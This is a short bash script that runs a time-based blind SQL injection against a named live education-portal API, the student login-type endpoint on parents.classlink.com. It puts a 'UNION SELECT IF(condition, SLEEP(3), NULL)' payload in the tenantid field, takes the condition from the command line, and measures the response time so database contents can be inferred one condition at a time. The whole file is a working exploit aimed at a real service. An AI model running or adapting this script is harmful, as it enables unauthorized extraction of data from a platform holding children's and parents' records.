#! /bin/bash

# Fun colors and styling
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
RESET='\033[0m'

# JSON syntax highlight function using jq and ANSI colors
highlight_json() {
  # Use jq to colorize JSON output
  # jq already colorizes if stdout is a terminal, but we force it for pipes
  jq --color-output .
}

if [ -z "$1" ]; then
  echo -e "${RED}Error:${RESET} No argument supplied for SQL condition."
  echo -e "Usage: $0 <SQL_CONDITION>"
  exit 1
fi

SQL_CONDITION="$1"
JSON_BODY="{\"user_name\":\"test@test.com\",\"tenantid\":\"3702 UNION SELECT IF($SQL_CONDITION, SLEEP(3), NULL) -- -\"}"

echo -e "${BOLD}${CYAN}[*] Posting:${RESET} ${YELLOW}https://parents.classlink.com/proxies/api/portal/student/logintype${RESET}"
echo -e "${BOLD}${CYAN}[*] With body:${RESET}"
echo ""
echo "$JSON_BODY" | highlight_json
echo ""

START_TIME=$(date +%s)

RES1=$(curl -s -X POST "https://parents.classlink.com/proxies/api/portal/student/logintype" \
  -H "Content-Type: application/json" \
  -d "$JSON_BODY")

echo -e "${BOLD}${CYAN}[*] Response JSON:${RESET} "
echo ""
echo "$RES1" | highlight_json
echo ""

END_TIME=$(date +%s)
ELAPSED_TIME=$((END_TIME - START_TIME))

echo -e "${BOLD}${CYAN}[*] Elapsed time:${RESET} ${YELLOW}${ELAPSED_TIME}s${RESET}"
echo ""
